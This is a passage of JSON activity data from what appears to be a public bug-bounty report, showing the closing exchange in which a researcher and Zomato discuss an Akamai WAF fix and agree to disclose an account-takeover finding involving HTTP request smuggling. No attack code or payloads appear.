posted.\u003c/p\u003e\n\n\u003cp\u003ePrateek\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-22T06:22:10.398Z","updated_at":"2020-01-22T06:22:10.398Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6839700,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @prateek_0490-zomato ,\n\nNo worries. Akamai’s threat analysis team did reach out to me on Friday. They mentioned this report is the second bug I found in their WAF (the first being from a different BB program) and wanted data on the test vectors I’ve been using. I provided that data late Friday. It was a national holiday in US on Monday so they are probably currently spinning up their test scripts with my vectors this week.\n\nBest,\n@defparam","markdown_message":"\u003cp\u003eHey \u003ca href=\"/prateek_0490-zomato\"\u003e@prateek_0490-zomato\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eNo worries. Akamai’s threat analysis team did reach out to me on Friday. They mentioned this report is the second bug I found in their WAF (the first being from a different BB program) and wanted data on the test vectors I’ve been using. I provided that data late Friday. It was a national holiday in US on Monday so they are probably currently spinning up their test scripts with my vectors this week.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\n\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-22T12:43:01.342Z","updated_at":"2020-01-22T12:43:01.342Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6839728,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@defparam - We thought so based on the conversations we're having with them. We're also going back and forth and pushing them :)\n\nThanks for the updates. Will let you know in case we hear back from them, and either way do let us know if you hear back from them first :)\n\nPrateek","markdown_message":"\u003cp\u003e\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e - We thought so based on the conversations we\u0026#39;re having with them. We\u0026#39;re also going back and forth and pushing them :)\u003c/p\u003e\n\n\u003cp\u003eThanks for the updates. Will let you know in case we hear back from them, and either way do let us know if you hear back from them first :)\u003c/p\u003e\n\n\u003cp\u003ePrateek\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-22T12:47:52.598Z","updated_at":"2020-01-22T12:47:52.598Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6888568,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"@defparam - We've heard back from them, they would be rolling out the platform level fix in the month of March.\n\nWe're closing out this issue as of now since we do have mitigations in place and are not totally dependent on AKAMAI.\n\nWe're looking forward to receive more reports from you.\n\nPrateek","markdown_message":"\u003cp\u003e\u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e - We\u0026#39;ve heard back from them, they would be rolling out the platform level fix in the month of March.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re closing out this issue as of now since we do have mitigations in place and are not totally dependent on AKAMAI.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re looking forward to receive more reports from you.\u003c/p\u003e\n\n\u003cp\u003ePrateek\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-28T08:24:41.364Z","updated_at":"2020-01-28T08:24:41.364Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"defparam","url":"/defparam"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6889875,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"March?! wow, yeah I don’t blame you guys. Well, things appeared good on the last scan. Looking forward to working with you again.\n\nCheers,\nEvan","markdown_message":"\u003cp\u003eMarch?! wow, yeah I don’t blame you guys. Well, things appeared good on the last scan. Looking forward to working with you again.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nEvan\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-28T10:42:08.398Z","updated_at":"2020-01-28T10:42:08.398Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8544736,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @defparam - Would you be willing to disclose this report? It will help the community to learn more on this attack :) Please do let me know if you need to redact/remove any of the contents?\n\nPrateek","markdown_message":"\u003cp\u003eHi \u003ca href=\"/defparam\"\u003e@defparam\u003c/a\u003e - Would you be willing to disclose this report? It will help the community to learn more on this attack :) Please do let me know if you need to redact/remove any of the contents?\u003c/p\u003e\n\n\u003cp\u003ePrateek\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-09T05:33:21.874Z","updated_at":"2020-07-09T05:33:21.874Z","first_to_agree":true,"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8544833,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Shall we disclose this report? It’s a good read for everyone.\n\nBest,\nEvan","markdown_message":"\u003cp\u003eShall we disclose this report? It’s a good read for everyone.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nEvan\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-09T05:56:04.258Z","updated_at":"2020-07-09T05:56:04.258Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8544834,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-09T05:56:04.346Z","updated_at":"2020-07-09T05:56:04.346Z","actor":{"username":"defparam","cleared":true,"url":"/defparam","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JpEU5FW9AQumZTKECZJJq1nu/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":23433,"category":"researcher","content":"Account takeover vulnerability using HTTP Request Smuggling and Desync attacks, this time through Akamai en route to Zomato. A big thanks to Zomato and Akamai for working with me to fix these issues in a timely manner.\n\nFor more information about these types of vulnerabilities check out my talk [Practical Attacks using HTTP Request Smuggling](https://youtu.be/3tpnuzFLU8g)","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eAccount takeover vulnerability using HTTP Request Smuggling and Desync attacks, this time through Akamai en route to Zomato. A big thanks to Zomato and Akamai for working with me to fix these issues in a timely manner.\u003c/p\u003e\n\n\u003cp\u003eFor more information about these types of vulnerabilities check out my talk \u003ca href=\"/redirect?url=https%3A%2F%2Fyoutu.be%2F3tpnuzFLU8g\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ePractical Attacks using HTTP Request Smuggling\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n"}]}